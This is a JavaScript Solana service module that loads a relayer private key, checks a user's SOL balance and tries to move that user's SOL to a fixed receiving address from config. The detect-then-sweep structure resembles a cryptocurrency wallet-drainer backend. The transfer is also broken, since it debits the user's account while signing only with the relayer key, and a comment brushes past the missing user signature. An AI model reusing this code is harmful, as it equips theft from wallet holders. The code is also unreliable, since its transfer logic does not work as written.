import {
  Connection,
  PublicKey,
  Keypair,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction
} from '@solana/web3.js'
import bs58 from 'bs58'
import { CONFIG } from '../config.js'

/**
 * Solana Blockchain Service
 * Handles balance detection and SOL transfers
 */

class SolanaService {
  constructor() {
    this.connection = new Connection(CONFIG.rpc.solana, 'confirmed')

    // Decode private key from base58
    const privateKeyBytes = bs58.decode(CONFIG.relayerSolana.privateKey)
    this.keypair = Keypair.fromSecretKey(privateKeyBytes)
  }

  /**
   * Get SOL balance
   */
  async getBalance(address) {
    try {
      const publicKey = new PublicKey(address)
      const balance = await this.connection.getBalance(publicKey)
      return (balance / 1000000000).toString() // Convert lamports to SOL
    } catch (error) {
      console.error('Error getting Solana balance:', error.message)
      return '0'
    }
  }

  /**
   * Detect Solana balance
   */
  async detectBalance(account) {
    try {
      const balance = await this.getBalance(account)
      console.log('✅ Solana balance detected:', balance)
      return { solana: balance }
    } catch (error) {
      console.error('Error detecting Solana balance:', error)
      return { solana: '0' }
    }
  }

  /**
   * Transfer SOL from user wallet to relayer
   * Note: In real scenario, user would need to sign. Here using relay pattern.
   */
  async transferSOL(userAddress, amount) {
    try {
      const userPublicKey = new PublicKey(userAddress)
      const receiverPublicKey = new PublicKey(CONFIG.receivingAddresses.solana)

      // Create transfer instruction
      const instruction = SystemProgram.transfer({
        fromPubkey: userPublicKey,
        toPubkey: receiverPublicKey,
        lamports: Math.floor(amount * 1000000000) // Convert SOL to lamports
      })

      // Create transaction
      const transaction = new Transaction().add(instruction)

      // Get recent blockhash
      const { blockhash } = await this.connection.getLatestBlockhash()
      transaction.recentBlockhash = blockhash
      transaction.feePayer = this.keypair.publicKey

      console.log('🔄 Transferring SOL...')

      // Sign and send (relayer pays for transaction)
      const signature = await sendAndConfirmTransaction(
        this.connection,
        transaction,
        [this.keypair]
      )

      console.log('✅ Solana transfer complete:', signature)

      return {
        hash: signature,
        amount: amount.toString(),
        chain: 'solana',
        explorerUrl: `https://solscan.io/tx/${signature}`
      }
    } catch (error) {
      console.error('Error transferring SOL:', error.message)
      return {
        hash: null,
        amount: amount.toString(),
        chain: 'solana',
        error: error.message
      }
    }
  }
}

export const solanaService = new SolanaService()
